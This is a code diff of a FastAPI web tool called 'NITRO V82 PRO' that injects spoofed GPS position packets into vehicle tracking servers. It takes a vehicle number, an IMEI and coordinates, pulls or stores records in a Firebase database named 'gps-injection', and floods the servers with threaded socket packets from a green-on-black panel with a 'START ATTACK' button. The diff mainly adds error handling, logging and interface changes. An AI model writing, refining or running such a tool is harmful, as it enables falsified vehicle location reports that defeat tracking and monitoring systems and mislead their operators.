@@ -9,17 +9,19 @@ from firebase_admin import credentials, db
 
 app = FastAPI()
 
-# --- 1. FIREBASE HANDSHAKE (FIXED URL) ---
+# --- FIREBASE SETUP ---
+db_connected = False
 try:
     cred = credentials.Certificate("serviceAccountKey.json")
     firebase_admin.initialize_app(cred, {
         'databaseURL': 'https://ghop-ghop-gps-injection-default-rtdb.firebaseio.com/'
     })
-    print("✓ FIREBASE_CONNECTED: SUCCESS")
+    db_connected = True
+    print("✓ DB_HANDSHAKE_SUCCESS")
 except Exception as e:
-    print(f"✗ FIREBASE_ERROR: {e}")
+    print(f"✗ DB_ERROR: {e}")
 
-# --- GLOBAL SETTINGS ---
+# --- SETTINGS ---
 firing = False
 total_sent = 0
 logs = []
@@ -32,7 +34,7 @@ def format_coord(val):
         return f"{p[0]}.{p[1][:7].ljust(7, '0')}" if len(p) > 1 else f"{val}.0000000"
     except: return val
 
-# --- ENGINE (LOCKED) ---
+# --- ENGINE ---
 def handshake_worker(tag_list, imei, vno, lat, lon):
     global firing, total_sent, logs
     while firing:
@@ -48,23 +50,24 @@ def handshake_worker(tag_list, imei, vno, lat, lon):
                 s.sendall(bytes(pkt, 'ascii'))
                 total_sent += 1
                 s.close()
-                logs.append(f"<span style='color:#0f0'>[{tm}] {tag} -> INJECTED</span>")
-                if len(logs) > 10: logs.pop(0)
+                logs.append(f"<span style='color:#0f0'>[{tm}] {tag} -> INJECTED_SUCCESS</span>")
+                if len(logs) > 15: logs.pop(0)
                 time.sleep(0.1)
-            except: time.sleep(1)
+            except Exception as e:
+                logs.append(f"<span style='color:#f00'>[ERR_CONN] {tag} FAIL: {str(e)[:15]}</span>")
+                time.sleep(1)
 
-# --- API ENDPOINTS (FIXED FETCH) ---
+# --- ENDPOINTS ---
 @app.get("/fetch_data")
 def fetch_data(vno: str):
-    vno_clean = vno.upper().strip()
+    v_clean = vno.upper().strip()
+    if not db_connected: return {"found": False, "err": "DB_OFFLINE"}
     try:
-        # DB Path matching your Data_Records structure
-        ref = db.reference('Data_Records').child(vno_clean)
+        ref = db.reference('Data_Records').child(v_clean)
         res = ref.get()
-        if res:
-            return {"found": True, "imei": res.get('IMEI_No',''), "lat": res.get('Lat',''), "lon": res.get('Lon','')}
-    except: pass
-    return {"found": False}
+        if res: return {"found": True, "imei": res.get('IMEI_No',''), "lat": res.get('Lat',''), "lon": res.get('Lon','')}
+        return {"found": False, "err": "NOT_FOUND"}
+    except Exception as e: return {"found": False, "err": str(e)[:10]}
 
 @app.get("/init")
 def init(v:str, i:str, lt:str, ln:str):
@@ -72,89 +75,77 @@ def init(v:str, i:str, lt:str, ln:str):
     if not firing:
         v_up = v.upper().strip()
         firing, total_sent = True, 0
-        logs = ["<span style='color:#fff'>[SYS] LOGGING TO DATABASE...</span>"]
+        logs = ["<span style='color:#fff'>[SYS] BOOTING STREAMS...</span>"]
         try:
-            db.reference('Data_Records').child(v_up).update({
-                'Vehicle_No': v_up, 'IMEI_No': i, 'Lat': lt, 'Lon': ln,
-                'Status': 'Active', 'Last_Attack': (datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)).strftime('%H:%M:%S')
-            })
-            logs.append("<span style='color:#deff9a'>[SYS] DB_SYNC: OK</span>")
-        except: logs.append("<span style='color:#f00'>[ERR] DB_SYNC: FAILED</span>")
-
+            db.reference('Data_Records').child(v_up).update({'Vehicle_No':v_up,'IMEI_No':i,'Lat':lt,'Lon':ln,'Status':'Active'})
+            logs.append("<span style='color:#0f0'>[DB] SYNC_COMPLETE</span>")
+        except: logs.append("<span style='color:#f00'>[ERR] DB_WRITE_FAILED</span>")
         chunks = [TAGS[x:x+5] for x in range(0, len(TAGS), 5)]
-        for c in chunks: threading.Thread(target=handshake_worker, args=(c, i, v_up, lt, ln), daemon=True).start()
+        for c in chunks: threading.Thread(target=handshake_worker, args=(c,i,v_up,lt,ln), daemon=True).start()
     return {"ok": True}
 
 @app.get("/stop")
 def stop():
-    global firing; firing = False
-    return {"ok": True}
+    global firing; firing = False; return {"ok": True}
 
 @app.get("/status")
 def status(): return {"c": total_sent, "l": logs}
 
-# --- GUI ---
+# --- UI ---
 @app.get("/", response_class=HTMLResponse)
 async def home():
     return """
-    <html><head><title>NITRO V82 PRO | MASTER</title><style>
-    body { background:#000; color:#0f0; font-family:monospace; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; }
-    .box { width:420px; border:2px solid #0f0; padding:25px; box-shadow:0 0 20px #0f0; background:rgba(0,10,0,0.95); border-radius:10px; }
-    label { font-size:11px; display:block; margin-top:12px; color:#aaa; text-transform:uppercase; }
-    input { width:100%; background:#000; border:1px solid #0f0; color:#0f0; padding:12px; outline:none; text-transform:uppercase; font-family:monospace; }
+    <html><head><title>NITRO V82 PRO | LIVE</title><style>
+    body { background:#000; color:#0f0; font-family:monospace; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; overflow:hidden; }
+    .box { width:420px; border:1px solid #0f0; padding:25px; box-shadow:0 0 20px #0f0; background:rgba(0,10,0,0.95); border-radius:10px; }
+    label { font-size:11px; display:block; margin-top:12px; color:#aaa; }
+    input { width:100%; background:#000; border:1px solid #0f0; color:#0f0; padding:12px; outline:none; text-transform:uppercase; }
     .btn-row { display:flex; gap:10px; margin-top:20px; }
     button { flex:1; padding:15px; cursor:pointer; border:1px solid #0f0; background:transparent; color:#0f0; font-weight:bold; }
     button:hover { background:#0f0; color:#000; }
-    #log { height:160px; background:#000800; border:1px dotted #0f0; margin-top:15px; padding:10px; font-size:11px; overflow-y:auto; }
+    #log { height:180px; background:#000800; border:1px dotted #0f0; margin-top:15px; padding:10px; font-size:11px; overflow-y:auto; scroll-behavior: smooth; }
+    .status-line { margin-top:10px; display:flex; justify-content:space-between; font-weight:bold; }
     </style></head><body>
     <div class="box">
         <h2 style="text-align:center;margin:0;letter-spacing:3px;">NITRO V82 PRO</h2>
         <label>> VEHICLE NUMBER</label>
-        <input type="text" id="v" oninput="this.value=this.value.toUpperCase()" onblur="fetchData()" placeholder="BR01XXXXXX">
+        <input type="text" id="v" oninput="this.value=this.value.toUpperCase()" onblur="fetchData()" placeholder="ENTER VNO">
         <label>> IMEI NUMBER</label>
         <input type="text" id="i" placeholder="15 DIGITS">
-        <div style="display:flex; gap:10px;">
-            <div style="flex:1"><label>> LATITUDE</label><input type="text" id="lt"></div>
-            <div style="flex:1"><label>> LONGITUDE</label><input type="text" id="ln"></div>
-        </div>
+        <div style="display:flex; gap:10px;"><div style="flex:1"><label>> LAT</label><input type="text" id="lt"></div><div style="flex:1"><label>> LON</label><input type="text" id="ln"></div></div>
         <div class="btn-row"><button onclick="st()">START ATTACK</button><button onclick="sp()" style="color:#f00; border-color:#f00;">ABORT</button></div>
-        <button onclick="location.reload()" style="width:100%;margin-top:10px;color:#ff0;border-color:#ff0;padding:8px;font-size:10px;background:none;border:1px solid;">SYSTEM RESET</button>
-        <div id="log">READY...</div>
-        <div style="margin-top:10px; display:flex; justify-content:space-between; font-weight:bold;">
-            <span>SENT: <b id="c" style="color:#fff">0</b></span>
-            <span id="st" style="color:#0f0">IDLE</span>
-        </div>
+        <button onclick="location.reload()" style="width:100%;margin-top:10px;color:#ff0;border-color:#ff0;background:none;border:1px solid;padding:8px;font-size:10px;">SYSTEM RESET</button>
+        <div id="log">SYSTEM_READY...</div>
+        <div class="status-line"><span>SENT: <b id="c" style="color:#fff">0</b></span><span id="st" style="color:#0f0">IDLE</span></div>
     </div>
     <script>
-        let monitor;
+        let mon;
         function fetchData() {
             let v = document.getElementById('v').value.trim();
             if(v.length > 4) {
+                document.getElementById('log').innerHTML += `<br>[SYS] FETCHING ${v}...`;
                 fetch(`/fetch_data?vno=${v}`).then(r=>r.json()).then(d=>{
                     if(d.found) {
-                        document.getElementById('i').value = d.imei;
-                        document.getElementById('lt').value = d.lat;
-                        document.getElementById('ln').value = d.lon;
-                        document.getElementById('log').innerHTML = "<span style='color:#fff'>[DB] DATA FETCHED SUCCESS</span>";
+                        document.getElementById('i').value=d.imei; document.getElementById('lt').value=d.lat; document.getElementById('ln').value=d.lon;
+                        document.getElementById('log').innerHTML += "<br><span style='color:#0f0'>[SUCCESS] DATA LOADED FROM DB</span>";
+                    } else {
+                        document.getElementById('log').innerHTML += `<br><span style='color:#f00'>[ERROR] ${d.err || 'NOT_FOUND'}</span>`;
                     }
+                    var objDiv = document.getElementById("log"); objDiv.scrollTop = objDiv.scrollHeight;
                 });
             }
         }
         function st() {
-            const v = document.getElementById('v').value;
-            const i = document.getElementById('i').value;
-            const lt = document.getElementById('lt').value;
-            const ln = document.getElementById('ln').value;
-            fetch(`/init?v=${v}&i=${i}&lt=${lt}&ln=${ln}`);
-            document.getElementById('st').innerText = "RUNNING";
-            if(!monitor) monitor = setInterval(() => {
+            fetch(`/init?v=${document.getElementById('v').value}&i=${document.getElementById('i').value}&lt=${document.getElementById('lt').value}&ln=${document.getElementById('ln').value}`);
+            document.getElementById('st').innerText="RUNNING"; document.getElementById('st').style.color="#f00";
+            if(!mon) mon = setInterval(() => {
                 fetch('/status').then(r=>r.json()).then(d=>{
                     document.getElementById('c').innerText = d.c;
                     document.getElementById('log').innerHTML = d.l.join("<br>");
-                    document.getElementById('log').scrollTop = document.getElementById('log').scrollHeight;
+                    var objDiv = document.getElementById("log"); objDiv.scrollTop = objDiv.scrollHeight;
                 });
             }, 1000);
         }
-        function sp() { fetch('/stop'); clearInterval(monitor); monitor=null; document.getElementById('st').innerText="IDLE"; }
+        function sp() { fetch('/stop'); clearInterval(mon); mon=null; document.getElementById('st').innerText="IDLE"; document.getElementById('st').style.color="#0f0"; }
     </script></body></html>
     """
